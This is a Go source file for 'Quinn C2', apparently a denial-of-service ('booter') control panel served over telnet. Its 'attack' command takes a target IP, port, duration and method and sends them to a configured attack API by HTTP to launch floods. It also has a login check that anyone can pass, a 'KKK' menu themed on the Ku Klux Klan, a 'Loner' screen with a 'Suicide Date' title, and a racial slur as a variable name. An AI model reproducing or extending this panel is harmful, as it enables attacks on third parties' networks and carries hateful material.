package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/winterssy/gjson"
)

func handler(conn net.Conn) {
	TOS(conn)
}

func TOS(conn net.Conn) {
	conn.Write([]byte(fmt.Sprintf("\033]0;Quinn C2 | Accept Tos To Use Quinn \007")))
	TOS, err := ioutil.ReadFile("Assets/Tos")
	if err != nil {
		conn.Write([]byte("\u001b[37mError Asset Not Found!\r\n"))
	}
	conn.Write([]byte(string(TOS)))
	for {
		conn.Write([]byte("\r\n[38;2;252;8;8m[[38;2;252;49;49m👑Q[38;2;252;90;90mu[38;2;252;131;131mi[38;2;252;172;172mn[38;2;252;213;213mn👑/Tos: "))
		Accept, _ := Read(conn)
		if Accept == "Agree" || Accept == "agree" || Accept == "AGREE" || Accept == "yes" || Accept == "YES" || Accept == "Yes" {
			cnc(conn)
		} else if Accept == "Disagree" || Accept == "disagree" || Accept == "DISAGREE" || Accept == "no" || Accept == "NO" {
			conn.Close()
		} else {
			conn.Write([]byte("\033[2J\033[1H"))
			TOS, err := ioutil.ReadFile("Assets/Tos")
			if err != nil {
				conn.Write([]byte("\u001b[37mError Asset Not Found!\r\n"))
			}
			conn.Write([]byte(string(TOS)))
		}
	}
}

func cnc(conn net.Conn) {
	now := time.Now()
	Month := now.Month()
	Day := now.Day()
	Year := now.Year()
	var (
		back   string = "\b"
		Clear  string = "<<clear>>"
		Sleep  string = "<<sleep(3)>>"
		client string = "<<User>>"
		Ip     string = "<<IP>>"
		Port   string = "<<Port>>"
		TIME   string = "<<Time>>"
		METHOD string = "<<Method>>"
	)
	CONFIG, err := ioutil.ReadFile("Config/Assets.json")
	if err != nil {
		fmt.Printf("\u001b[37m%v/%v/%v [Quinn] Config.json Was Not Found!", Month, Day, Year)
	}
	CON, _ := gjson.Parse(CONFIG)
	Ur := CON.GetString("UsernameInput")
	PW := CON.GetString("PasswordInput")
	ERRROR := CON.GetString("AssetError")
	conn.Write([]byte(fmt.Sprintf("\033]0;Quinn C2 | Login \007")))
	LOGIN := CON.GetString("Login")
	Login, _ := ioutil.ReadFile(LOGIN)
	if strings.Contains(string(Login), Clear) {
		conn.Write([]byte("\033[2J\033[1H"))
	}
	conn.Write([]byte(strings.Replace(string(Login), Clear, "\b", 1)))
	conn.Write([]byte(Ur))
	User, _ := Read(conn)
	conn.Write([]byte(PW))
	Pass, _ := Read(conn)
	if User == "Henti" || Pass == "root" {
	} else {
		conn.Write([]byte(fmt.Sprintf("\033]0;Quinn C2 | Invalid Login! Closing Quinn\007")))
		time.Sleep(1 * time.Second)
		conn.Close()
	}
	conn.Write([]byte(fmt.Sprintf("\033]0;Quinn C2 | User: "+User+" | Date: %v/%v/%v\007", Month, Day, Year)))
	broadcast, _ := ioutil.ReadFile("Logs/broadcast.txt")
	BANNER := CON.GetString("Banner")
	Banner, err := ioutil.ReadFile(BANNER)
	if strings.Contains(string(Banner), Clear) {
		conn.Write([]byte("\033[2J\033[1H"))
	}
	conn.Write([]byte("" + string(broadcast) + "\r\n"))
	conn.Write([]byte("\r\n"))
	conn.Write([]byte(strings.Replace(string(Banner), Clear, "\b", 1)))
	if err != nil {
		conn.Write([]byte("\033[2J\033[1H"))
		conn.Write([]byte(ERRROR))
		conn.Write([]byte("\r\n"))
	}
	for {
		INPUT := CON.GetString("MainInput")
		conn.Write([]byte(strings.Replace(string(INPUT), client, User, 1)))
		CmdLine, _ := Read(conn)
		if CmdLine == "cls" || CmdLine == "Clear" || CmdLine == "CLEAR" || CmdLine == "clear" || CmdLine == "cmds" || CmdLine == "CMDS" {
			conn.Write([]byte(fmt.Sprintf("\033]0;Quinn C2 | User: "+User+" | Date: %v/%v/%v\007", Month, Day, Year)))
			broadcast, _ := ioutil.ReadFile("Logs/broadcast.txt")
			Clearr := CON.GetString("Banner")
			Banner, err := ioutil.ReadFile(Clearr)
			if strings.Contains(string(Banner), Clear) {
				conn.Write([]byte("\033[2J\033[1H"))
			}
			conn.Write([]byte("" + string(broadcast) + "\r\n"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte(strings.Replace(string(Banner), Clear, "\b", 1)))
			if err != nil {
				conn.Write([]byte("\033[2J\033[1H"))
				conn.Write([]byte(ERRROR))
				conn.Write([]byte("\r\n"))
			}
		}
		if CmdLine == "help" || CmdLine == "HELP" || CmdLine == "Help" || CmdLine == "?" || CmdLine == "Cmds" || CmdLine == "CMDS" || CmdLine == "cmds" {
			HELP := CON.GetString("Help")
			Help, err := ioutil.ReadFile(HELP)
			if strings.Contains(string(Help), Clear) {
				conn.Write([]byte("\033[2J\033[1H"))
			}
			conn.Write([]byte(strings.Replace(string(Help), Clear, "\b", 1)))
			if err != nil {
				conn.Write([]byte("\033[2J\033[1H"))
				conn.Write([]byte(ERRROR))
				conn.Write([]byte("\r\n"))
			}
		}
		if CmdLine == "Broadcast" || CmdLine == "BROADCAST" || CmdLine == "broadcast" {
			conn.Write([]byte("[38;2;252;8;8m[[38;2;252;28;28mB[38;2;252;48;48mr[38;2;252;68;68mo[38;2;252;88;88ma[38;2;252;108;108md[38;2;252;128;128mC[38;2;252;148;148ma[38;2;252;168;168ms[38;2;252;188;188mt[38;2;252;208;208m][38;2;252;228;228m:\u001b[37m "))
			BroadCast, _ := Read(conn)
			Text := []byte(BroadCast)
			ioutil.WriteFile("Logs/broadcast.txt", Text, 3200)
			conn.Write([]byte("\033[2J\033[1H"))
			conn.Write([]byte("[38;2;255;0;220mB[38;2;255;21;222mr[38;2;255;42;224mo[38;2;255;63;226ma[38;2;255;84;228md[38;2;255;105;230mC[38;2;255;126;232ma[38;2;255;147;234ms[38;2;255;168;236mt[38;2;255;189;238mi[38;2;255;210;240mn[38;2;255;231;242mg " + BroadCast + " \r\n"))
			time.Sleep(1 * time.Second)
			conn.Write([]byte(fmt.Sprintf("\033]0;Quinn C2 | User: "+User+" | Date: %v/%v/%v\007", Month, Day, Year)))
			broadcast, _ := ioutil.ReadFile("Logs/broadcast.txt")
			Banner, err := ioutil.ReadFile("Assets/Banner")
			if strings.Contains(string(Banner), Clear) {
				conn.Write([]byte("\033[2J\033[1H"))
			}
			conn.Write([]byte(string(broadcast)))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte(strings.Replace(string(Banner), Clear, "\b", 1)))
			if err != nil {
				conn.Write([]byte("\033[2J\033[1H"))
				conn.Write([]byte(ERRROR))
				conn.Write([]byte("\r\n"))
			}
		}
		if CmdLine == "KKK" || CmdLine == "kkk" || CmdLine == "Kkk" {
			conn.Write([]byte(fmt.Sprintf("\033]0;Klu Klux Klan Network | User: "+User+" | Date: %v/%v/%v\007", Month, Day, Year)))
			KLUX := CON.GetString("KKK")
			KKK, err := ioutil.ReadFile(KLUX)
			if strings.Contains(string(KKK), Clear) {
				conn.Write([]byte("\033[2J\033[1H"))
			}
			conn.Write([]byte(strings.Replace(string(KKK), Clear, "\b", 1)))
			if err != nil {
				conn.Write([]byte("\033[2J\033[1H"))
				conn.Write([]byte(ERRROR))
				conn.Write([]byte("\r\n"))
			}

		}
		if CmdLine == "Loner" || CmdLine == "loner" || CmdLine == "LONER" {
			conn.Write([]byte(fmt.Sprintf("\033]0;Loner C2 | User: "+User+" | Suicide Date: %v/%v/%v\007", Month, Day, Year)))
			broadcast, _ := ioutil.ReadFile("Logs/broadcast.txt")
			LONER := CON.GetString("Loner")
			Loner, err := ioutil.ReadFile(LONER)
			if strings.Contains(string(Loner), Clear) {
				conn.Write([]byte("\033[2J\033[1H"))
			}
			conn.Write([]byte(string(broadcast)))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte(strings.Replace(string(Loner), Clear, "\b", 1)))
			if err != nil {
				conn.Write([]byte("\033[2J\033[1H"))
				conn.Write([]byte(ERRROR))
				conn.Write([]byte("\r\n"))
			}

		}
		if CmdLine == "gif" || CmdLine == "Gif" || CmdLine == "GIF" {
			Gif, err := ioutil.ReadFile("Assets/Gifs/gif")
			if strings.Contains(string(Gif), Sleep) {
				time.Sleep(1)
				conn.Write([]byte(strings.Replace(string(Gif), Sleep, "\b", 1)))
			}
			if err != nil {
				conn.Write([]byte("\033[2J\033[1H"))
				conn.Write([]byte(ERRROR))
				conn.Write([]byte("\r\n"))
			}
		}
		if CmdLine == "Credit" || CmdLine == "Info" || CmdLine == "info" || CmdLine == "INFO" || CmdLine == "CREDIT" {
			Info, err := ioutil.ReadFile("Assets/Info")
			if strings.Contains(string(Info), Clear) {
				conn.Write([]byte("\033[2J\033[1H"))
			}
			conn.Write([]byte(strings.Replace(string(Info), Clear, "\b", 1)))
			if err != nil {
				conn.Write([]byte("\033[2J\033[1H"))
				conn.Write([]byte(ERRROR))
				conn.Write([]byte("\r\n"))
			}
		}
		if CmdLine == "attack" || CmdLine == "ack" || CmdLine == "ATTACK" || CmdLine == "ACK" || CmdLine == "Attack" {
			api, err := ioutil.ReadFile("Config/api.json")
			if err != nil {
				fmt.Printf("\u001b[37m%v/%v/%v [Quinn] api.json Is Missing!\n", Month, Day, Year)
			}
			parse, _ := gjson.Parse(api)
			API := parse.GetString("RAW", "API")
			conn.Write([]byte("\033[2J\033[1H"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("[38;2;253;239;249m                         ╔═╗╔═╗╔╗╔╔╦╗  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═\r\n"))
			conn.Write([]byte("[38;2;251;217;242m                         ╚═╗║╣ ║║║ ║║  ╠═╣ ║  ║ ╠═╣║  ╠╩╗\r\n"))
			conn.Write([]byte("[38;2;251;217;242m                         ╚═╝╚═╝╝╚╝═╩╝  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\r\n"))
			conn.Write([]byte("[38;2;249;194;234m                               👑 𝓢𝓮𝓷𝓭 𝓐𝓽𝓽𝓪𝓬𝓴 👑\r\n"))
			conn.Write([]byte("[38;2;247;171;227m                      ══╦═══════════════════════════════╦══\r\n"))
			conn.Write([]byte("[38;2;245;148;219m                     ╔══╩═══════════════════════════════╩══╗\r\n"))
			conn.Write([]byte("[38;2;243;125;211m                      [Target] -\r\n"))
			conn.Write([]byte("[38;2;241;102;204m                      [Port] - \r\n"))
			conn.Write([]byte("[38;2;239;79;196m                      [TIME] - \r\n"))
			conn.Write([]byte("[38;2;236;56;188m                      [Method] - \r\n"))
			conn.Write([]byte("[38;2;236;56;188m                     ╚═════════════════════════════════════╝\r\n"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("\u001b[37mIP: "))
			IP, _ := Read(conn)
			conn.Write([]byte("\033[2J\033[1H"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("[38;2;253;239;249m                         ╔═╗╔═╗╔╗╔╔╦╗  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═\r\n"))
			conn.Write([]byte("[38;2;251;217;242m                         ╚═╗║╣ ║║║ ║║  ╠═╣ ║  ║ ╠═╣║  ╠╩╗\r\n"))
			conn.Write([]byte("[38;2;251;217;242m                         ╚═╝╚═╝╝╚╝═╩╝  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\r\n"))
			conn.Write([]byte("[38;2;249;194;234m                               👑 𝓢𝓮𝓷𝓭 𝓐𝓽𝓽𝓪𝓬𝓴 👑\r\n"))
			conn.Write([]byte("[38;2;247;171;227m                      ══╦═══════════════════════════════╦══\r\n"))
			conn.Write([]byte("[38;2;245;148;219m                     ╔══╩═══════════════════════════════╩══╗\r\n"))
			conn.Write([]byte("[38;2;243;125;211m                      [Target] - " + IP + "\r\n"))
			conn.Write([]byte("[38;2;241;102;204m                      [Port] - \r\n"))
			conn.Write([]byte("[38;2;239;79;196m                      [TIME] - \r\n"))
			conn.Write([]byte("[38;2;236;56;188m                      [Method] - \r\n"))
			conn.Write([]byte("[38;2;236;56;188m                     ╚═════════════════════════════════════╝\r\n"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("\u001b[37mPORT: "))
			PORT, _ := Read(conn)
			conn.Write([]byte("\033[2J\033[1H"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("[38;2;253;239;249m                         ╔═╗╔═╗╔╗╔╔╦╗  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═\r\n"))
			conn.Write([]byte("[38;2;251;217;242m                         ╚═╗║╣ ║║║ ║║  ╠═╣ ║  ║ ╠═╣║  ╠╩╗\r\n"))
			conn.Write([]byte("[38;2;251;217;242m                         ╚═╝╚═╝╝╚╝═╩╝  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\r\n"))
			conn.Write([]byte("[38;2;249;194;234m                               👑 𝓢𝓮𝓷𝓭 𝓐𝓽𝓽𝓪𝓬𝓴 👑\r\n"))
			conn.Write([]byte("[38;2;247;171;227m                      ══╦═══════════════════════════════╦══\r\n"))
			conn.Write([]byte("[38;2;245;148;219m                     ╔══╩═══════════════════════════════╩══╗\r\n"))
			conn.Write([]byte("[38;2;243;125;211m                      [Target] - " + IP + "\r\n"))
			conn.Write([]byte("[38;2;241;102;204m                      [Port] - " + PORT + "\r\n"))
			conn.Write([]byte("[38;2;239;79;196m                      [TIME] - \r\n"))
			conn.Write([]byte("[38;2;236;56;188m                      [Method] - \r\n"))
			conn.Write([]byte("[38;2;236;56;188m                     ╚═════════════════════════════════════╝\r\n"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("\u001b[37mTime: "))
			Time, _ := Read(conn)
			conn.Write([]byte("\033[2J\033[1H"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("[38;2;253;239;249m                         ╔═╗╔═╗╔╗╔╔╦╗  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═\r\n"))
			conn.Write([]byte("[38;2;251;217;242m                         ╚═╗║╣ ║║║ ║║  ╠═╣ ║  ║ ╠═╣║  ╠╩╗\r\n"))
			conn.Write([]byte("[38;2;251;217;242m                         ╚═╝╚═╝╝╚╝═╩╝  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\r\n"))
			conn.Write([]byte("[38;2;249;194;234m                               👑 𝓢𝓮𝓷𝓭 𝓐𝓽𝓽𝓪𝓬𝓴 👑\r\n"))
			conn.Write([]byte("[38;2;247;171;227m                      ══╦═══════════════════════════════╦══\r\n"))
			conn.Write([]byte("[38;2;245;148;219m                     ╔══╩═══════════════════════════════╩══╗\r\n"))
			conn.Write([]byte("[38;2;243;125;211m                      [Target] - " + IP + "\r\n"))
			conn.Write([]byte("[38;2;241;102;204m                      [Port] - " + PORT + "\r\n"))
			conn.Write([]byte("[38;2;239;79;196m                      [TIME] - " + Time + "\r\n"))
			conn.Write([]byte("[38;2;236;56;188m                      [Method] - \r\n"))
			conn.Write([]byte("[38;2;236;56;188m                     ╚═════════════════════════════════════╝\r\n"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("\u001b[37mMethod: "))
			Method, _ := Read(conn)
			conn.Write([]byte("\033[2J\033[1H"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("[38;2;253;239;249m                         ╔═╗╔═╗╔╗╔╔╦╗  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═\r\n"))
			conn.Write([]byte("[38;2;251;217;242m                         ╚═╗║╣ ║║║ ║║  ╠═╣ ║  ║ ╠═╣║  ╠╩╗\r\n"))
			conn.Write([]byte("[38;2;251;217;242m                         ╚═╝╚═╝╝╚╝═╩╝  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\r\n"))
			conn.Write([]byte("[38;2;249;194;234m                               👑 𝓢𝓮𝓷𝓭 𝓐𝓽𝓽𝓪𝓬𝓴 👑\r\n"))
			conn.Write([]byte("[38;2;247;171;227m                      ══╦═══════════════════════════════╦══\r\n"))
			conn.Write([]byte("[38;2;245;148;219m                     ╔══╩═══════════════════════════════╩══╗\r\n"))
			conn.Write([]byte("[38;2;243;125;211m                      [Target] - " + IP + "\r\n"))
			conn.Write([]byte("[38;2;241;102;204m                      [Port] - " + PORT + "\r\n"))
			conn.Write([]byte("[38;2;239;79;196m                      [TIME] - " + Time + "\r\n"))
			conn.Write([]byte("[38;2;236;56;188m                      [Method] - " + Method + "\r\n"))
			conn.Write([]byte("[38;2;236;56;188m                     ╚═════════════════════════════════════╝\r\n"))
			conn.Write([]byte("\r\n"))
			ApiIP := strings.Replace(API, Ip, IP, 1)
			ApiPort := strings.Replace(ApiIP, Port, PORT, 1)
			ApiTime := strings.Replace(ApiPort, TIME, Time, 1)
			ApiMethod := strings.Replace(ApiTime, METHOD, Method, 1)
			_, ERR := http.Get(ApiMethod)
			if ERR != nil {
				fmt.Printf("\u001b[37m%v/%v/%v [Quinn] API Request Failed!\n", Month, Day, Year)
			}
			conn.Write([]byte(fmt.Sprintf("\033]0;Quinn C2 | Sent An Attack To " + IP + " For " + Time + "\007")))
			conn.Write([]byte("\033[2J\033[1H"))
			conn.Write([]byte("\r\n"))
			conn.Write([]byte("[38;2;253;239;249m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗\r\n"))
			conn.Write([]byte("[38;2;251;217;242m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ \r\n"))
			conn.Write([]byte("[38;2;251;217;242m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ \r\n"))
			conn.Write([]byte("[38;2;249;194;234m                           👑 𝓐𝓽𝓽𝓪𝓬𝓴 𝓦𝓪𝓼 𝓢𝓾𝓬𝓬𝓮𝓼𝓼𝓯𝓾𝓵👑\r\n"))
			conn.Write([]byte("[38;2;247;171;227m                      ══╦═══════════════════════════════╦══\r\n"))
			conn.Write([]byte("[38;2;245;148;219m                     ╔══╩═══════════════════════════════╩══╗\r\n"))
			conn.Write([]byte("[38;2;243;125;211m                      [Target] - " + IP + "\r\n"))
			conn.Write([]byte("[38;2;241;102;204m                      [Port] - " + PORT + "\r\n"))
			conn.Write([]byte("[38;2;239;79;196m                      [TIME] - " + Time + "\r\n"))
			conn.Write([]byte("[38;2;236;56;188m                      [Method] - " + Method + "\r\n"))
			conn.Write([]byte("[38;2;236;56;188m                     ╚═════════════════════════════════════╝\r\n"))
			conn.Write([]byte("\r\n"))
		}
		if CmdLine == "length" || CmdLine == "Length" || CmdLine == "LENGTH" {
			conn.Write([]byte("Name: "))
			niga, _ := Read(conn)
			len := len(niga)
			result := strings.Repeat(back, len)
			conn.Write([]byte("╔═══╚════════════════════════════════╝════╗\r\n"))
			conn.Write([]byte("║              " + niga + "                           " + result + "║\r\n"))

		}
	}
}

//func FILE(PATH string) string {
//	var (
//		back   string = "\b"
//		Clear  string = "<<clear>>"
//		Sleep  string = "<<sleep(3)>>"
//		client string = "<<User>>"
//		Ip     string = "<<IP>>"
//		Port   string = "<<Port>>"
//		TIME   string = "<<Time>>"
//		METHOD string = "<<Method>>"
//	)
//	path, err := ioutil.ReadFile(PATH)
//	if err != nil {
//		err := "Asset Path Not Found!"
//		return err
//	}
//	strings.Contains(string(path), Clear)
//	{
//		return "\033[2J\033[1H"
//	}
//	cnc(User)
//	USER := strings.Replace(string(path), client, ""+ User +"",1)
//
//	return """"
//}

func Read(conn net.Conn) (out string, err error) {
	var n int
	for {
		buf := make([]byte, 1)
		n, err = conn.Read(buf)
		if n == 0 || err != nil {
			return
		}
		switch buf[0] {
		case 10:
			return
		case 13, 27:
			continue
		case 9:
		case 8, 127:
			if len(out) > 0 {
				out = out[len(out)-1:]
			}
		default:
			out += string(buf[0])
		}
	}
}
